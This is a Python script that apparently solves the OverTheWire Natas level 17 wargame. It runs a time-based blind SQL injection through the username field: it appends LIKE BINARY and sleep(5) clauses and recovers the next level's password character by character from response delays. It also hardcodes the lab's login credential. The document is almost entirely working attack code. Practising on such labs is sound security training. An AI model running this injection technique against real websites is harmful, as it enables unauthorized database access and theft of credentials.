import requests
from requests.auth import HTTPBasicAuth
from string import ascii_letters
ch = ascii_letters+'0123456789'
url = 'http://natas17.natas.labs.overthewire.org/index.php' #?debug會進入調適模式，可加可不加
ps17 = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
user = 'natas17'
passwd=''
for i in range(64):
    for chr in ch:
        atmp = {'username' : 'natas18" and password LIKE BINARY "' + passwd + chr + '%"'+' and sleep(5)' +' #'} #natas16" :將script中本來的左雙引號封閉
        r = requests.post(url,auth=HTTPBasicAuth(user,ps17),data = atmp)
        #print(r.text)
        if r.elapsed.seconds >= 4:
            passwd+=chr
            print(passwd)
            break
    if len(passwd) < i+1:
        break

